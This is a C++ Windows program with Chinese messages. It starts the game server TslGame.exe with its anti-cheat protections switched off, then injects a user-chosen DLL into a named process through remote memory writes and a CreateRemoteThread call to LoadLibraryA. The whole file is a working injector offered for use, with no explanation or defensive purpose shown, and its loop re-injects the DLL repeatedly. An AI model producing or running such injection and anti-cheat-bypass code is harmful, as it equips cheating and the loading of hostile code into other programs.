#include <iostream>
#include <windows.h>
#include <thread>
#include <tlhelp32.h>
#include <string>

// Convert std::string to std::wstring
std::wstring StringToWString(const std::string& str) {
    return std::wstring(str.begin(), str.end());
}

// Function to inject a DLL into a process
bool InjectDLL(const std::string& processName, const std::string& dllPath) {
    // Validate DLL path
    if (INVALID_FILE_ATTRIBUTES == GetFileAttributesA(dllPath.c_str()) && GetLastError() == ERROR_FILE_NOT_FOUND) {
        std::cerr << "无法找到DLL: " << dllPath << std::endl;
        return false;
    }

    // Find the target process
    DWORD processID = 0;
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snapshot == INVALID_HANDLE_VALUE) {
        std::cerr << "无法获取进程快照." << std::endl;
        return false;
    }

    PROCESSENTRY32W processEntry = {};
    processEntry.dwSize = sizeof(PROCESSENTRY32W);

    if (Process32FirstW(snapshot, &processEntry)) {
        do {
            if (StringToWString(processName) == processEntry.szExeFile) {
                processID = processEntry.th32ProcessID;
                break;
            }
        } while (Process32NextW(snapshot, &processEntry));
    }

    CloseHandle(snapshot);

    if (processID == 0) {
        std::cerr << "无法寻找进程: " << processName << std::endl;
        return false;
    }

    // Open the target process
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, processID);
    if (!hProcess) {
        std::cerr << "无法启动目标进程，错误: " << GetLastError() << std::endl;
        return false;
    }

    // Allocate memory in the target process for the DLL path
    void* pRemoteMemory = VirtualAllocEx(hProcess, nullptr, dllPath.size() + 1, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!pRemoteMemory) {
        std::cerr << "无法为进程分配内存，错误: " << GetLastError() << std::endl;
        CloseHandle(hProcess);
        return false;
    }

    // Write the DLL path into the allocated memory
    if (!WriteProcessMemory(hProcess, pRemoteMemory, dllPath.c_str(), dllPath.size() + 1, nullptr)) {
        std::cerr << "无法将DLL写入程序，错误: " << GetLastError() << std::endl;
        VirtualFreeEx(hProcess, pRemoteMemory, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return false;
    }

    // Get the address of LoadLibraryA
    HMODULE hKernel32 = GetModuleHandle(L"kernel32.dll");
    if (!hKernel32) {
        std::cerr << "无法链接到库 kernel32.dll ，错误: " << GetLastError() << std::endl;
        VirtualFreeEx(hProcess, pRemoteMemory, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return false;
    }

    FARPROC pLoadLibrary = GetProcAddress(hKernel32, "LoadLibraryA");
    if (!pLoadLibrary) {
        std::cerr << "无法获取到 LoadLibraryA，错误: " << GetLastError() << std::endl;
        VirtualFreeEx(hProcess, pRemoteMemory, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return false;
    }

    // Create a remote thread to execute LoadLibraryA with the DLL path
    HANDLE hThread = CreateRemoteThread(hProcess, nullptr, 0, (LPTHREAD_START_ROUTINE)pLoadLibrary, pRemoteMemory, 0, nullptr);
    if (!hThread) {
        std::cerr << "无法在远程程序中创建线程，错误: " << GetLastError() << std::endl;
        VirtualFreeEx(hProcess, pRemoteMemory, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return false;
    }

    WaitForSingleObject(hThread, INFINITE);

    // Clean up
    CloseHandle(hThread);
    VirtualFreeEx(hProcess, pRemoteMemory, 0, MEM_RELEASE);
    CloseHandle(hProcess);

    std::cout << "已成功将DLL注入到程序: " << processName << " (PID: " << processID << ")" << std::endl;
    return true;
}

int main() {

    // Start the batch file
    system("start TslGame.exe /Game/Maps/Erangel/Erangel_Main?listen?game=/Game/Blueprints/TSLGameMode.TSLGameMode_C -LOG -nullrhi -nosound -AllowJoinAnyMatchState -Windowed -Window -Server -port=8888 -NoVerifyGC -NoEAC -NoBattleEye");
    std::this_thread::sleep_for(std::chrono::seconds(1));

    std::cout << "请输入或复制你的游戏主程序的目录（或程序完整名称）。\n";
    std::string nameProcess;
    std::cin >> nameProcess;
    const std::string processName = nameProcess;

    std::cout << "请输入或复制你需要使用的DLL文件的目录（或文件完整名称）。\n";
    std::string pathDll;
    std::cin >> pathDll;
    const std::string dllPath = pathDll;

    while (true) {
        // Check if the process is running
        HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        if (snapshot == INVALID_HANDLE_VALUE) {
            std::cerr << "无法获取进程快照。" << std::endl;
            std::this_thread::sleep_for(std::chrono::seconds(1));
            continue;
        }

        PROCESSENTRY32W processEntry = {};
        processEntry.dwSize = sizeof(PROCESSENTRY32W);
        bool processFound = false;

        if (Process32FirstW(snapshot, &processEntry)) {
            do {
                if (StringToWString(processName) == processEntry.szExeFile) {
                    processFound = true;
                    break;
                }
            } while (Process32NextW(snapshot, &processEntry));
        }

        CloseHandle(snapshot);

        if (processFound) {
            std::cout << "已找到进程: " << processName << ". 等待15秒后自动注入..." << std::endl;
            std::this_thread::sleep_for(std::chrono::seconds(15));

            if (!InjectDLL(processName, dllPath)) {
                std::cerr << "Injection failed." << std::endl;
            }
        }
        else {
            std::this_thread::sleep_for(std::chrono::seconds(1));
        }
    }

    return 0;
}
